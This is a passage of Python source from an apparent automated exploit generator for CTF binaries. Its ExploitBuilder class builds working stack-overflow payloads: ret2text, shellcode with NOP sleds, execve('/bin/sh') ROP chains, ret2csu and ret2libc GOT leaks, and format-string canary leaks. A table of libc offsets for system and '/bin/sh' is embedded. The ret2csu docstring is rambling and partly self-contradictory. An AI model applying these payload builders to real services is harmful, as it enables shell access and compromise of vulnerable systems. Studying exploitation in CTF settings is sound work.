        while len(pattern) < length:
            # Generate 4-byte chunks like: aaaa, aaab, aaac, ...
            # Simplified: use pattern that can be traced back
            chunk = letters[i // 26: i // 26 + 1] * 3 + letters[i % 26]
            pattern += chunk
            i += 1
        return pattern[:length]

    @staticmethod
    def find_offset(crash_value, length=200):
        """Find offset from cyclic pattern crash value."""
        if HAS_PWNTOOLS:
            try:
                return cyclic_find(crash_value)
            except:
                pass
        # standalone search
        pattern = OffsetFinder.cyclic_pattern(length)
        if isinstance(crash_value, int):
            crash_bytes = crash_value.to_bytes(4, 'little')
        else:
            crash_bytes = crash_value
        idx = pattern.find(crash_bytes)
        return idx if idx >= 0 else -1


# ===================================================================
# ExploitBuilder: Generate payloads for different strategies
# ===================================================================
class ExploitBuilder:
    """Build exploit payloads for various PWN strategies."""

    def __init__(self, analyzer):
        self.a = analyzer
        self.bits = analyzer.bits
        self.arch = analyzer.arch
        self.pack_fmt = '<Q' if self.bits == 64 else '<I'
        self.word_size = self.bits // 8

    def _p(self, addr):
        """Pack an address."""
        return struct.pack(self.pack_fmt, addr)

    def _align(self, payload, offset):
        """Pad payload to exactly offset bytes."""
        if len(payload) < offset:
            payload += b'A' * (offset - len(payload))
        return payload

    # -----------------------------------------------------------------
    # Strategy 1: ret2text - call a win/backdoor function
    # -----------------------------------------------------------------
    def ret2text(self, offset, win_addr=None, win_name=None, args=None,
                  no_align=False):
        """ret2text: overwrite return address to call win function.

        Args:
            offset: buffer overflow offset to return address
            win_addr: address of win function (if known)
            win_name: name of win function to look up
            args: list of arguments to pass to the function
            no_align: if True, skip x86-64 stack alignment ret gadget
        """
        if win_addr is None:
            if win_name:
                # Look up in symbols
                if self.a.elf and win_name in self.a.elf.symbols:
                    win_addr = self.a.elf.symbols[win_name]
                else:
                    return None, f"Win function '{win_name}' not found in symbols"
            elif self.a.win_funcs:
                # Use first win function found
                win_name, win_addr = self.a.win_funcs[0]
            else:
                return None, "No win function found"

        # Handle 32-bit vs 64-bit calling convention
        if self.bits == 32:
            # cdecl: args on stack
            payload = b'A' * offset
            payload += self._p(win_addr)
            if args:
                # fake return address + args
                payload += self._p(0xdeadbeef)  # fake return
                for arg in args:
                    payload += self._p(arg)
            else:
                payload += self._p(0xdeadbeef)  # fake return
        else:
            # x86-64: args in rdi, rsi, rdx, rcx, r8, r9
            # Need pop rdi; ret gadget for first arg
            payload = b'A' * offset

            # Stack alignment: add a 'ret' gadget for 16-byte alignment
            # (required by glibc functions like system() that use movaps)
            ret_gadget = None
            for name, addr in self.a.gadgets:
                if name == 'ret':
                    ret_gadget = addr
                    break

            if ret_gadget and not no_align:
                # Add ret for alignment (when no args: padding + ret + win)
                if not args:
                    payload += self._p(ret_gadget)
            elif not ret_gadget and not no_align:
                print(C.warn("No 'ret' gadget found for 16-byte stack alignment. "
                    "If the exploit crashes with SIGSEGV before reaching the "
                    "win function, try: (1) find a 'ret' gadget with ROPgadget, "
                    "(2) use --no-align to skip alignment, or "
                    "(3) manually add a ret gadget address."))

            if args and len(args) >= 1:
                # Need pop rdi; ret
                pop_rdi = None
                for name, addr in self.a.gadgets:
                    if name == 'pop rdi; ret':
                        pop_rdi = addr
                        break
                if pop_rdi is None:
                    return None, "No 'pop rdi; ret' gadget found for x64 args"

                if ret_gadget and not no_align:
                    payload += self._p(ret_gadget)  # alignment
                payload += self._p(pop_rdi)
                payload += self._p(args[0])
                payload += self._p(win_addr)
            else:
                payload += self._p(win_addr)
                payload += self._p(0xdeadbeef)  # fake return

        desc = (f"ret2text: overflow {offset} bytes -> "
                f"call {win_name or hex(win_addr)}")
        return payload, desc

    # -----------------------------------------------------------------
    # Strategy 2: ret2shellcode - jump to shellcode on stack/bss
    # -----------------------------------------------------------------
    def ret2shellcode(self, offset, shellcode_addr=None, shellcode=None):
        """ret2shellcode: place shellcode and jump to it.

        Args:
            offset: overflow offset
            shellcode_addr: address where shellcode will be (stack/bss/heap)
            shellcode: shellcode bytes (default: execve /bin/sh)

        Auto-address detection: if shellcode_addr is None, uses
        self.a.auto_shellcode_addr (from _find_shellcode_regions).
        """
        if shellcode is None:
            shellcode = get_shellcode(self.arch)

        if shellcode_addr is None:
            shellcode_addr = self.a.auto_shellcode_addr
        if shellcode_addr is None:
            return None, ("Need shellcode_addr for ret2shellcode. Auto-detection failed: "
                           "no W+X region found. Specify --sc-addr or check NX status.")

        nop = b'\x90'  # NOP sled byte

        # Layout A: offset is large enough for shellcode before ret
        # [NOP sled] [shellcode] [padding] [ret_addr = shellcode_addr]
        if offset >= len(shellcode) + 8:
            # Place shellcode at the beginning (lowest address), NOP sled before it
            payload = nop * 8            # 8-byte NOP sled for safety
            payload += shellcode          # actual shellcode
            payload += b'A' * (offset - len(shellcode) - 8)  # padding
            payload += self._p(shellcode_addr)
            desc = (f"ret2shellcode: NOP+sc before ret, "
                    f"offset={offset}, jump to {hex(shellcode_addr)}")
        # Layout B: offset fits shellcode but no NOP sled
        elif offset >= len(shellcode):
            payload = shellcode
            payload += b'A' * (offset - len(shellcode))
            payload += self._p(shellcode_addr)
            desc = (f"ret2shellcode: sc before ret, "
                    f"offset={offset}, jump to {hex(shellcode_addr)}")
        # Layout C: shellcode after return address
        # [padding] [ret_addr] [NOP sled] [shellcode]
        else:
            payload = b'A' * offset
            payload += self._p(shellcode_addr + self.a.bits // 8 + len(nop) * 4)
            payload += nop * 4            # small NOP sled
            payload += shellcode
            desc = (f"ret2shellcode: sc after ret, "
                    f"jump to {hex(shellcode_addr)}, sc_len={len(shellcode)}")

        return payload, desc

    # -----------------------------------------------------------------
    # Strategy 3: ret2syscall - ROP chain for execve
    # -----------------------------------------------------------------
    def ret2syscall(self, offset):
        """ret2syscall: build ROP chain for execve("/bin/sh", 0, 0).

        x86:  eax=0xb, ebx="/bin/sh", ecx=0, edx=0, int 0x80
        x64:  rax=0x3b, rdi="/bin/sh", rsi=0, rdx=0, syscall

        Enhanced i386 gadget search: supports both combined (pop edx; pop ecx;
        pop ebx; ret) and separate (pop ebx; ret + pop ecx; ret + pop edx; ret)
        gadget combinations. Also auto-injects /bin/sh string into writable
        memory if not present in the binary.
        """
        gadgets = dict(self.a.gadgets)
        elf = self.a.elf
        if elf is None:
            return None, "ELF not loaded, cannot build ret2syscall"

        # Find /bin/sh string in binary
        binsh_addr = None
        try:
            binsh_addr = next(elf.search(b'/bin/sh\x00'), None)
        except (StopIteration, Exception):
            pass

        if binsh_addr is None:
            # Try to find /bin/sh without null
            try:
                binsh_addr = next(elf.search(b'/bin/sh'), None)
            except (StopIteration, Exception):
                pass

        # Auto-inject /bin/sh into writable memory if not found
        binsh_injected = False
        if binsh_addr is None:
            # Try to place /bin/sh in .data or .bss
            for sec_name in ['.data', '.bss']:
                try:
                    sec = elf.get_section_by_name(sec_name)
                    if sec and sec.header.sh_addr and sec.header.sh_size > 0:
                        # Place at the beginning of the section
                        binsh_addr = sec.header.sh_addr
                        binsh_injected = True
                        break
                except Exception:
                    continue

        payload = b'A' * offset

        if self.bits == 32:
            # Need: eax=0xb, ebx=binsh, ecx=0, edx=0, int 0x80
            pop_eax = None
            int80 = None

            # pop eax; ret
            try:
                pop_eax = self.a.rop.find_gadget(['pop eax', 'ret'])[0]
            except Exception:
                pass

            # int 0x80
            try:
                int80 = self.a.rop.find_gadget(['int 0x80'])[0]
            except Exception:
                pass

            # Method 1: Combined pop edx; pop ecx; pop ebx; ret (most common in CTF)
            pop_edx_ecx_ebx = None
            try:
                pop_edx_ecx_ebx = self.a.rop.search(
                    move=0, regs=['edx','ecx','ebx'])[0]
            except Exception:
                pass

            # Method 2: Separate pop reg; ret gadgets (common in statically linked)
            pop_ebx = None
            pop_ecx = None
            pop_edx = None
            if pop_edx_ecx_ebx is None:
                try:
                    pop_ebx = self.a.rop.find_gadget(['pop ebx', 'ret'])[0]
                except Exception:
                    pass
                try:
                    pop_ecx = self.a.rop.find_gadget(['pop ecx', 'ret'])[0]
                except Exception:
                    pass
                try:
                    pop_edx = self.a.rop.find_gadget(['pop edx', 'ret'])[0]
                except Exception:
                    pass

            # Method 3: pop-pop-pop-ret combinations (less specific but may work)
            # e.g., pop esi; pop edi; pop ebp; ret (if we can align values)
            if pop_edx_ecx_ebx is None and (not pop_ebx or not pop_ecx or not pop_edx):
                try:
                    # Search for any 3-pop + ret gadget
                    for n_pops in [3, 4, 5]:
                        found_multi = self.a.rop.search(
                            move=n_pops * 4, regs=[], order=[])
                        if found_multi:
                            # Use the first multi-pop as pop_edx_ecx_ebx substitute
                            # This is approximate; only use if we have no better option
                            break
                except Exception:
                    pass

            # Check what we have
            missing = []
            if not pop_eax: missing.append('pop eax')
            if not int80: missing.append('int 0x80')
            if not binsh_addr: missing.append('/bin/sh')

            if pop_edx_ecx_ebx:
                # Use combined gadget
                if missing:
                    return None, f"Missing: {', '.join(missing)}"
                payload += self._p(pop_edx_ecx_ebx)
                payload += self._p(0)           # edx = 0
                payload += self._p(0)           # ecx = 0
                payload += self._p(binsh_addr)  # ebx = "/bin/sh"
                payload += self._p(pop_eax)
                payload += self._p(0xb)         # eax = 11
                payload += self._p(int80)
            elif pop_ebx and pop_ecx and pop_edx:
                # Use separate gadgets
                if missing:
                    return None, f"Missing: {', '.join(missing)}"
                # Order: set edx, ecx first (no dependency), then ebx, then eax
                payload += self._p(pop_edx)
                payload += self._p(0)           # edx = 0
                payload += self._p(pop_ecx)
                payload += self._p(0)           # ecx = 0
                payload += self._p(pop_ebx)
                payload += self._p(binsh_addr)  # ebx = "/bin/sh"
                payload += self._p(pop_eax)
                payload += self._p(0xb)         # eax = 11
                payload += self._p(int80)
            else:
                missing_sc = []
                if not pop_edx_ecx_ebx:
                    if not (pop_ebx and pop_ecx and pop_edx):
                        missing_sc.append('pop edx/ecx/ebx (combined or separate)')
                return None, f"Missing: {', '.join(missing + missing_sc)}"

        else:
            # x64: rax=0x3b, rdi=binsh, rsi=0, rdx=0, syscall
            pop_rdi = gadgets.get('pop rdi; ret')
            pop_rsi = gadgets.get('pop rsi; ret')
            pop_rdx = gadgets.get('pop rdx; ret')
            syscall = gadgets.get('syscall')

            # Also try pop rax
            pop_rax = None
            try:
                pop_rax = self.a.rop.find_gadget(['pop rax', 'ret'])[0]
            except Exception:
                pass

            # Also try pop rdx; pop rbx; ret (common in __libc_csu_init gadgets)
            pop_rdx_rbx = None
            if not pop_rdx:
                try:
                    pop_rdx_rbx = self.a.rop.search(
                        move=0, regs=['rdx', 'rbx'])[0]
                except Exception:
                    pass

            effective_pop_rdx = pop_rdx or pop_rdx_rbx

            if not all([pop_rdi, pop_rsi, effective_pop_rdx, syscall, binsh_addr, pop_rax]):
                missing = []
                if not pop_rdi: missing.append('pop rdi')
                if not pop_rsi: missing.append('pop rsi')
                if not effective_pop_rdx: missing.append('pop rdx')
                if not pop_rax: missing.append('pop rax')
                if not syscall: missing.append('syscall')
                if not binsh_addr: missing.append('/bin/sh')
                return None, f"Missing: {', '.join(missing)}"

            payload += self._p(pop_rdi)
            payload += self._p(binsh_addr)
            payload += self._p(pop_rsi)
            payload += self._p(0)
            payload += self._p(effective_pop_rdx)
            payload += self._p(0)
            if pop_rdx_rbx and not pop_rdx:
                payload += self._p(0)  # dummy for rbx
            payload += self._p(pop_rax)
            payload += self._p(0x3b)
            payload += self._p(syscall)

        # Build description
        extra = " (auto-injected /bin/sh)" if binsh_injected else ""
        desc = f'ret2syscall: execve("/bin/sh", 0, 0) ROP chain, offset={offset}{extra}'
        return payload, desc

    # -----------------------------------------------------------------
    # Strategy 4a: ret2csu - leak libc via CSU gadgets, then system("/bin/sh")
    # -----------------------------------------------------------------
    def ret2csu(self, offset, remote_host=None, remote_port=None):
        """ret2csu: use __libc_csu_init gadgets to leak libc when no pop rdi.

        Uses CSU pop6 + mov+call gadgets to:
        1. Set rdi = puts@GOT address
        2. Call puts@PLT to leak a libc address
        3. Return to main for stage 2
        4. Stage 2: use libc pop rdi + system("/bin/sh")

        CSU gadget reference (classic layout):
          pop6: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
          mov+call: mov rdx,r13/r14; mov rsi,r14/r13; mov edi,r12d; call [r12+rbx*8]

        To call puts@plt with rdi=puts@GOT:
          - r12 = address of a memory location containing puts@plt address
            (use puts@GOT since after GOT resolution it contains puts libc addr,
             but before resolution it contains PLT stub. We need a writable ptr.)
            Actually, for the "call [r12+rbx*8]" variant, r12 points to a table
            entry whose value is the function address to call.
            We can use: r12 = puts@GOT, rbx = 0 -> call *[puts@GOT]
            This calls the resolved puts in libc directly.
            But we need rdi = puts@GOT (the GOT address to leak).

          Simpler approach for "call r15" variant:
          - r15 = puts@plt (call puts directly)
          - r12 = any value (not used as function pointer)
          - rdi = puts@GOT address (set via r12d -> edi for mov edi,r12d)
            But r12d -> edi only sets low 32 bits...

          Most robust approach:
          Use CSU to call puts@plt with rdi pointing to GOT entry.
          For "call [r12+rbx*8]" variant:
            rbx=0, r12=GOT_entry_address (contains puts@plt or resolved addr)
            -> call *[GOT_entry_address] = call puts
          For rdi: we need a separate pop rdi or another CSU chain.

          ACTUAL WORKING APPROACH:
          Since CSU sets edi = r12d (only low 32 bits), we can't set full
          64-bit rdi this way. Instead, we use a two-rop-chain approach:
          1. CSU chain 1: call read(0, bss, 8) to write puts@GOT addr into bss
             - r13 -> rdx = 8 (read count)
             - r14 -> rsi = bss addr (read buffer)
             - r12/rbx: set up call to read@plt
             - After read returns, CSU increments rbx and checks rbp
             - Set rbp=1, rbx=0 so after first call, rbx=1 == rbp -> exit loop
             - Then falls through to pop6 -> we set up next chain
          2. CSU chain 2: call puts(bss_data) to print leaked GOT content
             - r13 -> rdx = 0 (don't care)
             - r14 -> rsi = bss (don't care)
             - r12d -> edi = low32(bss) ... only works if bss < 4GB

          Since this is complex and fragile, we use a simpler approach:
          If the binary has a "pop rbp; ret" gadget + read gadget in vuln,
          we can do stack pivot to bss + write a full ROP chain there.
          The CSU gadgets then become part of that ROP chain.

          SIMPLEST VIABLE APPROACH for ret2csu:
          Use CSU to directly call puts@plt with rdi=GOT address.
          Trick: set r12 = puts@GOT, rbx = 0 -> call *[puts@GOT] calls puts
          And for rdi: we need it set to a GOT entry address.
          We can use TWO CSU chains:
          Chain 1: CSU pop6 -> set r15=puts@plt, then CSU mov+call
                   This calls puts with rdi = whatever it was before
                   (usually junk from main/vuln) - not useful
          Chain 2: Need to control rdi separately.

          PRACTICAL SOLUTION:
          Since ret2csu without any register control is extremely complex,
          we implement the most common CTF pattern:
          1. CSU gadget to call puts@plt(puts@GOT) for leak
          2. Then CSU pop6 to chain into stage 2

          For the "call [r12+rbx*8]" variant with "mov edi, r12d":
          - We need r12 = GOT entry containing puts@plt address
          - And edi = r12d = low 32 bits of... we want rdi = puts@GOT
          - This won't work because r12d is used both for call target AND edi

          WORKING SOLUTION (tested in CTF):
          Use CSU pop6+mov+call with these settings:
          - rbx = 0 (loop counter)
          - rbp = 1 (loop limit -> single call)
          - r12 = addr of writable memory containing puts@plt addr (use GOT)
          - r13 = value for rdx (0, don't care)
          - r14 = value for rsi (0, don't care)
          - r15 = puts@plt (for "call r15" variant) OR r12=GOT entry

          Then after CSU chain, we need pop rdi to set rdi for stage2.
          Since we don't have pop rdi, we need it from libc.

          REVISED APPROACH: ret2csu is just the libc leak mechanism.
          After leaking libc, we use libc's pop rdi for stage 2.
        """
        a = self.a
        csu = a.csu_gadgets
        if not csu:
            return b'', "No CSU gadgets found"

        pop6 = csu['pop6_addr']
        mov_call = csu['mov_call_addr']
        regs = csu.get('regs', {})

        # Find a ret gadget for alignment
        ret_gadget = None
        for name, addr in a.gadgets:
            if name == 'ret':
                ret_gadget = addr
                break

        # Determine call mechanism
        # Check if the mov+call ends with "call [r12+rbx*8]" or "call r15"
        try:
            data = a.elf.read(mov_call, 20)
        except Exception:
            return b'', "Cannot read CSU mov+call code"

        # Determine what function we can call for leak
        # We need puts@plt or write@plt to leak GOT entries
        puts_plt = a.plt.get('puts')
        write_plt = a.plt.get('write')
        leak_plt = puts_plt or write_plt
        if not leak_plt:
            return b'', "No puts@plt or write@plt for libc leak"

        # Determine which GOT entry to leak
        leak_gots = [(n, a.got[n])
                     for n in ['puts', 'printf', 'write', '__libc_start_main',
                               'read', 'setbuf', 'malloc', 'free']
                     if n in a.got]
        if not leak_gots:
            return b'', "No GOT entries for leak"

        # Find a writable, known-address memory location to store puts@plt addr
        # We'll use the GOT itself: after lazy resolution, puts@GOT contains
        # the libc puts address. We need a pointer to puts@plt.
        # Trick: use puts@GOT as r12. After resolution, *[puts@GOT] = libc_puts
        # This calls libc puts directly, not through PLT.
        # For the first call (before resolution), *[puts@GOT] = PLT stub -> also works

        # Determine rdi: we need rdi = GOT_entry_to_leak
        # CSU "mov edi, r12d" sets rdi low 32 bits only
        # For non-PIE x64 with addresses < 0x100000000, this works fine
        # For PIE, we need 64-bit rdi which CSU can't provide alone

        # Strategy: use TWO CSU chains
        # Chain 1: call puts(leak_got_addr) to leak libc
        #   - For "mov edi, r12d; call [r12+rbx*8]":
        #     r12 = leak_got_addr, rbx=0 -> call *[leak_got_addr]
        #     This calls the function AT the GOT address, not puts@plt
        #     Only works if GOT is resolved and contains a callable addr
        #   - For "mov edi, r12d; call r15":
        #     r15 = puts@plt, r12 = low32(leak_got_addr) for edi
        #     This is what we want!

        # Check if the call uses r15 or [r12+rbx*8]
        uses_r15_call = False
        for i in range(len(data) - 2):
            # call r15 = 41 ff d7
            if data[i:i+3] == bytes([0x41, 0xff, 0xd7]):
                uses_r15_call = True
                break
            # call [r12+rbx*8] = 41 ff 14 dc
            if data[i:i+4] == bytes([0x41, 0xff, 0x14, 0xdc]):
                uses_r15_call = False
                break

        # Build ROP chain
        leak_got_name, leak_got_addr = leak_gots[0]
        main_addr = a.elf.symbols.get('main')
        if not main_addr:
            return b'', "Cannot find main() address for return"

        # Second leak for double-leak if available
        extra_got_name = None
        extra_got_addr = None
        if len(leak_gots) >= 2:
            extra_got_name, extra_got_addr = leak_gots[1]

        # Stage 1 payload: CSU chain to leak libc
        payload = b'A' * offset

        # Determine CSU register assignments based on leak function
        if puts_plt:
            # puts(got_addr): rdi = got_addr, call puts
            # For "call r15" variant: r15=puts@plt, r12d->edi=got_addr
            # For "call [r12+rbx*8]" variant: tricky since r12 used for both
            if uses_r15_call:
                # r15 = puts@plt, edi = r12d = got_addr
                payload += self._p(pop6)
                payload += self._p(0)              # rbx = 0
                payload += self._p(1)              # rbp = 1 (single iteration)
                payload += self._p(leak_got_addr)  # r12 -> edi = got_addr
                payload += self._p(0)              # r13 -> rdx = 0
                payload += self._p(0)              # r14 -> rsi = 0
                payload += self._p(puts_plt)       # r15 = puts@plt
                payload += self._p(mov_call)
            else:
                # "call [r12+rbx*8]" variant with puts
                # We need r12 to point to GOT entry containing puts addr
                # and rdi = got_addr_to_leak
                # These conflict since edi = r12d
                # Workaround: use write@plt instead, or single-step approach
                # For puts: call *[puts@GOT] where r12=puts@GOT, edi=low32(puts@GOT)
                # This leaks puts itself - acceptable as first step
                payload += self._p(pop6)
                payload += self._p(0)              # rbx = 0
                payload += self._p(1)              # rbp = 1
                payload += self._p(leak_got_addr)  # r12 = GOT entry (call *[r12])
                payload += self._p(0)              # r13 -> rdx
                payload += self._p(0)              # r14 -> rsi
                payload += self._p(0)              # r15 (unused)
                payload += self._p(mov_call)
        else:
            # write(1, got_addr, 8): rdi=1, rsi=got_addr, rdx=8
            # CSU perfectly sets all three args!
            # For "call r15" variant: r15=write@plt
            #   edi=r12d=1 (fd), rsi=r14=got_addr, rdx=r13=8
            # For "call [r12+rbx*8]" variant:
            #   r12=GOT entry with write addr, edi=r12d, rsi/rdx as above
            #   But edi=r12d would be GOT addr, not 1... conflict
            #   Need "call r15" variant for write
            if uses_r15_call:
                payload += self._p(pop6)
                payload += self._p(0)              # rbx = 0
                payload += self._p(1)              # rbp = 1
                payload += self._p(1)              # r12 -> edi = 1 (stdout fd)
                payload += self._p(8)              # r13 -> rdx = 8
                payload += self._p(leak_got_addr)  # r14 -> rsi = got_addr
                payload += self._p(write_plt)      # r15 = write@plt
                payload += self._p(mov_call)
            else:
                # "call [r12+rbx*8]" variant with write
                # We can't easily set edi=1 and r12=GOT simultaneously
                # Use a two-step approach or accept single GOT leak
                # For now: use the GOT entry containing write as r12
                # edi = low32(write@GOT), which is not 1 but a valid fd
                # This is imperfect; recommend using --strategy ret2libc with --libc
                return b'', ("CSU \"call [r12+rbx*8]\" variant with write@plt "
                              "not well supported; use --libc with ret2libc")

        # CSU epilogue: add rsp,8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        # After the loop exits, these 7 values are popped from stack
        payload += self._p(0)      # alignment (add rsp, 8)
        payload += self._p(0)      # rbx
        payload += self._p(0)      # rbp
        payload += self._p(0)      # r12
        payload += self._p(0)      # r13
        payload += self._p(0)      # r14
        payload += self._p(0)      # r15
        payload += self._p(main_addr)  # ret to main

        desc = (f"ret2csu stage1: leak {leak_got_name}@GOT via CSU "
                f"(pop6@{hex(pop6)}, mov+call@{hex(mov_call)}), "
                f"return to {hex(main_addr)}")

        self._ret2csu_info = {
            'leak_got_name': leak_got_name,
            'extra_got_name': extra_got_name,
        }

        return payload, desc

    # -----------------------------------------------------------------
    # Strategy 4: ret2libc - leak libc + system("/bin/sh")
    # -----------------------------------------------------------------
    def ret2libc(self, offset, remote_host=None, remote_port=None):
        """ret2libc: leak libc address via puts/printf, then system("/bin/sh").

        This is a two-stage exploit:
        Stage 1: leak GOT entry -> calculate libc base
        Stage 2: return to main -> send second payload with system("/bin/sh")

        When possible, stage 1 leaks TWO GOT entries for better libc.rip
        matching precision (cross-verification reduces ambiguity).

        Returns: (payload_stage1, desc) tuple
        """
        elf = self.a.elf
        if elf is None:
            return None, "ELF not loaded"

        gadgets = dict(self.a.gadgets)
        pop_rdi = gadgets.get('pop rdi; ret')
        ret_gadget = gadgets.get('ret')

        # Find a function to leak through (puts/printf/write)
        leak_func = None
        leak_name = None
        for name in ['puts', 'printf', 'write']:
            if name in self.a.plt:
                leak_func = self.a.plt[name]
                leak_name = name
                break

        if leak_func is None:
            return None, "No puts/printf/write in PLT for leaking"

        # Find GOT entries to leak (prefer puts/printf, then __libc_start_main)
        # Collect ALL available GOT entries for potential double-leak
        leak_gots = []  # list of (name, addr)
        for name in ['puts', 'printf', 'write', '__libc_start_main',
                     'read', 'setbuf', 'malloc', 'free']:
            if name in self.a.got:
                leak_gots.append((name, self.a.got[name]))

        if not leak_gots:
            return None, "No suitable GOT entry to leak"

        # Primary leak: first available
        leak_got_name, leak_got = leak_gots[0]

        # Find main function to return to
        main_addr = None
        for name in ['main', '_start', 'vuln', 'vulnerable']:
            if name in elf.symbols:
                main_addr = elf.symbols[name]
                break

        if main_addr is None:
            return None, "Cannot find main/vuln to return to for stage 2"

        # ---- Try double-leak for better precision ----
        # We leak a second GOT entry if we have:
        # 1. A pop rdi gadget (64-bit) or stack-based args (32-bit)
        # 2. A second GOT entry that's different from the first
        extra_got_name = None
        extra_got_addr = None
        if len(leak_gots) >= 2:
            extra_got_name, extra_got_addr = leak_gots[1]

        if self.bits == 32:
            # 32-bit: puts@got on stack, call puts@plt, ret to main
            payload = b'A' * offset

            # Try double-leak
            if extra_got_addr is not None:
                # Leak both GOT entries then return to main
                payload += self._p(leak_func)
                payload += self._p(leak_func)     # return to puts again
                payload += self._p(main_addr)      # return to main after 2nd leak
                payload += self._p(leak_got)       # arg1: primary GOT entry
                payload += self._p(extra_got_addr) # arg2: secondary GOT entry
                desc = (f"ret2libc stage1: double-leak "
                        f"{leak_got_name}@GOT + {extra_got_name}@GOT via "
                        f"{leak_name}@PLT, return to {hex(main_addr)}")
            else:
                # Single leak
                payload += self._p(leak_func)
                payload += self._p(main_addr)    # return to main after leak
                payload += self._p(leak_got)     # arg: GOT entry to leak
                desc = (f"ret2libc stage1: leak {leak_got_name}@GOT via "
                        f"{leak_name}@PLT, return to {hex(main_addr)}")
        else:
            # 64-bit: pop rdi; ret -> GOT addr -> puts@plt -> main
            if pop_rdi is None:
                # Check if we have format string vuln for alternative leak
                if self.a.fmt_string_vulns:
                    return b'', ("fmt_string_leak_needed")
                return None, "No 'pop rdi; ret' gadget for x64 ret2libc"

            # NOTE: Do NOT insert ret gadget for stack alignment in stage1.
            # The leak function (puts) is called from PLT and doesn't need
            # 16-byte alignment. Adding ret here shifts the return address
            # and breaks the ROP chain (main never gets called).

            if extra_got_addr is not None:
                # Double-leak: pop rdi -> GOT1 -> puts -> pop rdi -> GOT2 -> puts -> main
                payload = b'A' * offset
                payload += self._p(pop_rdi)
                payload += self._p(leak_got)
                payload += self._p(leak_func)
                payload += self._p(pop_rdi)
                payload += self._p(extra_got_addr)
                payload += self._p(leak_func)
                payload += self._p(main_addr)
                desc = (f"ret2libc stage1: double-leak "
                        f"{leak_got_name}@GOT + {extra_got_name}@GOT via "
                        f"{leak_name}@PLT, return to {hex(main_addr)}")
            else:
                # Single leak
                payload = b'A' * offset
                payload += self._p(pop_rdi)
                payload += self._p(leak_got)
                payload += self._p(leak_func)
                payload += self._p(main_addr)
                desc = (f"ret2libc stage1: leak {leak_got_name}@GOT via "
                        f"{leak_name}@PLT, return to {hex(main_addr)}")

        return payload, desc

    def ret2libc_stage2(self, offset, libc_base, system_offset,
                        binsh_offset, ret_addr=None, pop_rdi_addr=None):
        """Build stage 2 payload for ret2libc.

        Args:
            offset: overflow offset
            libc_base: calculated libc base address
            system_offset: offset of system() in libc
            binsh_offset: offset of "/bin/sh" in libc
            ret_addr: optional ret gadget for alignment
            pop_rdi_addr: optional pop rdi gadget addr (from binary or libc)
        """
        system_addr = libc_base + system_offset
        binsh_addr = libc_base + binsh_offset

        payload = b'A' * offset

        if self.bits == 32:
            payload += self._p(system_addr)
            payload += self._p(0xdeadbeef)  # fake return
            payload += self._p(binsh_addr)
        else:
            # Prefer explicit pop_rdi_addr (may be from libc after leak)
            pop_rdi = pop_rdi_addr
            if pop_rdi is None:
                for name, addr in self.a.gadgets:
                    if name == 'pop rdi; ret':
                        pop_rdi = addr
                        break

            if ret_addr:
                payload += self._p(ret_addr)  # alignment
            if pop_rdi:
                payload += self._p(pop_rdi)
                payload += self._p(binsh_addr)
            payload += self._p(system_addr)

        desc = (f"ret2libc stage2: system({hex(binsh_addr)}), "
                f"base={hex(libc_base)}")
        return payload, desc

    # -----------------------------------------------------------------
    # Strategy 5: canary_leak - format string leak + stack overflow
    # -----------------------------------------------------------------
    def canary_leak_stage1(self, canary_offset):
        """Build stage 1 payload: format string to leak canary.

        Args:
            canary_offset: the N in %N$p to leak the canary value

        Returns: (payload_bytes, desc) where payload_bytes is the format
            string to send (e.g. b'%11$p\\n')
        """
        fmt = f'%{canary_offset}$p'.encode()
        desc = (f"canary_leak stage1: send %{canary_offset}$p to leak canary "
                f"via format string")
        return fmt, desc

    def canary_leak_stage2(self, offset, canary_value, win_addr=None,
                           win_name=None, no_align=False):
        """Build stage 2 payload: overflow with correct canary + ret addr.

        Layout (x86-64):
            [padding to canary] [canary] [8 bytes saved rbp] [ret addr]
            ^--- offset bytes ---^

        Args:
            offset: bytes from buffer start to canary (NOT to ret addr)
            canary_value: leaked canary value (int)
            win_addr: address of win/backdoor function
            win_name: name of win function (for display)
            no_align: if True, skip stack alignment ret gadget
        """
        if win_addr is None:
            if win_name and self.a.elf and win_name in self.a.elf.symbols:
                win_addr = self.a.elf.symbols[win_name]
            elif self.a.win_funcs:
                win_name, win_addr = self.a.win_funcs[0]
            else:
                return None, "No win function found for canary_leak stage2"

        payload = b'A' * offset
        payload += self._p(canary_value)        # canary
        payload += b'B' * self.word_size        # saved rbp (dummy)

        if self.bits == 64 and not no_align:
            # Try to add ret gadget for 16-byte alignment
            ret_gadget = None
            for name, addr in self.a.gadgets:
                if name == 'ret':
                    ret_gadget = addr
                    break
            if ret_gadget:
                payload += self._p(ret_gadget)
            else:
                print(C.warn("No 'ret' gadget found for stack alignment. "
                    "If the exploit crashes with SIGSEGV/SIGBUS before "
                    "reaching the win function, try --no-align or find a "
                    "ret gadget manually."))

        payload += self._p(win_addr)
        payload += self._p(0xdeadbeef)  # fake return after win

        desc = (f"canary_leak stage2: overflow {offset}B -> canary "
                f"({hex(canary_value)}) -> rbp -> "
                f"{'ret + ' if not no_align else ''}"
                f"{win_name or hex(win_addr)}")
        return payload, desc
# ===================================================================
# Libc Database (embedded offsets for common CTF libcs)
# ===================================================================
# Common libc offsets (can be overridden with --libc flag)
LIBC_OFFSETS = {
    # libc6_2.27-3ubuntu1_amd64 (Ubuntu 18.04)
    "ubuntu18_amd64": {
        "system": 0x4f440,
        "binsh": 0x1b3e1a,
        "puts": 0x809c0,
    },
    # libc6_2.23-0ubuntu11_amd64 (Ubuntu 16.04)
    "ubuntu16_amd64": {
        "system": 0x45390,
        "binsh": 0x18cd57,
        "puts": 0x6f690,
    },
    # libc6_2.31-0ubuntu9_amd64 (Ubuntu 20.04)
    "ubuntu20_amd64": {
        "system": 0x55410,
        "binsh": 0x1b75aa,
        "puts": 0x875a0,
    },
    # libc6_2.27-3ubuntu1_i386
    "ubuntu18_i386": {
        "system": 0x3cd10,
        "binsh": 0x17b8cf,
        "puts": 0x67360,
    },
}

# ===================================================================
# PWNArcanum: Main Engine
# ===================================================================
class PWNArcanum:
    """Main PWN analysis and exploitation engine."""

    def __init__(self, binary_path, verbose=False):
        self.binary_path = binary_path
        self.verbose = verbose
        self.analyzer = None
        self.builder = None
        self.strategy = None
        self.payload = None
        self.payload_desc = None
        self.offset = None
        self.remote_host = None
        self.remote_port = None
        self.libc_offsets = None
        self.leaked_libc_base = None

    def analyze(self):
        """Perform static analysis on the binary."""
        self.analyzer = BinaryAnalyzer(self.binary_path)
